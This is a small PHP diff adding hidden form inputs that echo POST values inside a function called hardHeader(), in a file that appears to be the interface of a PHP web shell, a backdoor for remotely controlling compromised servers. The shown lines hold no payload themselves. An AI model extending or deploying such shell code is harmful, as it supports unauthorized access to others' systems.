@@ -173,6 +173,13 @@ function hardHeader() {
 <input type=hidden name=p2> 
 <input type=hidden name=p3> 
 <input type=hidden name=charset> 
+<input type=hidden name=1 value='" . htmlspecialchars(@$_POST['1']) . "'> 
+<input type=hidden name=2 value='" . htmlspecialchars(@$_POST['2']) . "'> 
+<input type=hidden name=3 value='" . htmlspecialchars(@$_POST['3']) . "'> 
+
+
+" . htmlspecialchars(@$_POST['a']) . "
+
 </form>"; 
     $freeSpace = @diskfreespace($GLOBALS['cwd']); 
     $totalSpace = @disk_total_space($GLOBALS['cwd']); 
